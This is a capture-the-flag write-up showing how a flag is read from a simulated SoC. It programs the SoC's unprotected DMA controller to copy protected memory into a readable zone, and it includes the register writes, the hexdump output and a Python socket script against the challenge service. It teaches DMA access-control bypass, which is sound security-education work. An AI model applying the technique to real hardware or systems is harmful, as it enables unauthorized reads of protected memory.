# Welcome to the SoC

- **Category:** Misc
- **Challenge ID:** 27
- **Points:** 103
- **Service:** `nc 51.11.228.103 1337`

```
THC{DMA-1s_n0t_5tr0ng_en0ugh?}
```

## TL;DR

- A simulated SoC exposes a shell with `cat`, `hexdump`, `write_mem`, and a 64 KB flat memory map. The flag is at `0x200`, inside the protected system zone (`0x0000–0x0FFF`) — direct reads are denied.
- A DMA controller is mapped at `0x4000` with the classic `SA / DA / BTT` registers. It enforces no protection: writing `BTT` triggers a copy from `SA` to `DA`.
- Program the DMA to copy from `0x200` (flag) to `0x1000` (user zone), then `hexdump 0x1000` to read the flag.

## 1. Recon

```
> help
ls, cat, lscpu, hexdump <addr> <len>, write_mem <addr> <val>

> cat /sys/user_guide.txt
Memory map:
  0x0000 - 0x0FFF  System zone (protected - no direct read)
  0x1000 - 0xEFFF  User zone (read/write)
  0xF000 - 0xFFFF  MMIO

DMA Controller at 0x4000:
  SA  (Source)      at 0x4018  [write]
  DA  (Destination) at 0x4020  [write]
  BTT (Bytes To Tx) at 0x4028  [write]   ← writing BTT triggers the transfer
```

The flag is straightforwardly blocked at the shell:

```
> cat /root/flag.txt
Error: access denied (address 0x00000200 is in protected zone 0x0000-0x0FFF)
```

## 2. Vulnerability — protection at the shell layer only

The shell guards `cat` / `hexdump` against the protected range, but the DMA controller is hardware-level and has full memory access. There is no IOMMU translation, no per-channel ACL, no scrub of the system zone — `BTT` triggers a straight memcpy across any address pair. Classic real-world DMA attack reduced to two registers.

## 3. Exploit

Three writes program the channel; the third triggers it. Then read the destination.

```
> write_mem 0x4018 0x00000200       # SA = flag address
OK
> write_mem 0x4020 0x00001000       # DA = anywhere in [0x1000, 0xEFFF]
OK
> write_mem 0x4028 0x00000040       # BTT = 64; transfer fires
DMA transfer complete: 64 bytes copied from 0x200 to 0x1000

> hexdump 0x1000 0x40
00001000: 54 48 43 7b 44 4d 41 2d  THC{DMA-
00001008: 31 73 5f 6e 30 74 5f 35  1s_n0t_5
00001010: 74 72 30 6e 67 5f 65 6e  tr0ng_en
00001018: 30 75 67 68 3f 7d 0a 00  0ugh?}..
```

```
THC{DMA-1s_n0t_5tr0ng_en0ugh?}
```

## 4. One-liner

```python
import socket, time, re

CMDS = [
    "write_mem 0x4018 0x00000200",
    "write_mem 0x4020 0x00001000",
    "write_mem 0x4028 0x00000040",
    "hexdump 0x1000 0x40",
]

with socket.create_connection(("51.11.228.103", 1337), timeout=10) as s:
    time.sleep(0.3); s.recv(4096)
    for c in CMDS:
        s.sendall((c + "\n").encode()); time.sleep(0.2)
    time.sleep(0.4)
    out = s.recv(8192).decode(errors="replace")

bytes_ascii = "".join(chr(int(t, 16)) for t in out.split()
                     if len(t) == 2 and all(c in "0123456789abcdef" for c in t)
                     and 32 <= int(t, 16) < 127)
print(re.search(r"THC\{[^}]+\}", bytes_ascii).group(0))
```

## 5. Methodology

- **Two-layer protection is single-layer security.** When the protected resource is in memory and *any* DMA-capable peripheral can address it, software-level access checks at the shell are decorative.
- **Standard DMA controllers map three registers (`SA`, `DA`, `BTT`) and trigger on `BTT`.** Don't search for an "execute" bit — write to the byte count last.
- **Real-world parallel:** the OS-level analogue is FireWire/Thunderbolt/PCIe DMA reading kernel memory. Mitigation requires an IOMMU and per-device IO virtual address spaces — the simulator deliberately omits both, and the flag's wording (*"DMA is not strong enough?"*) is the author's wink at it.
- **Read the doc, not the binary.** `/sys/user_guide.txt` listed the exact register offsets needed. The exploit path was implicit in the documentation; no reversing required.
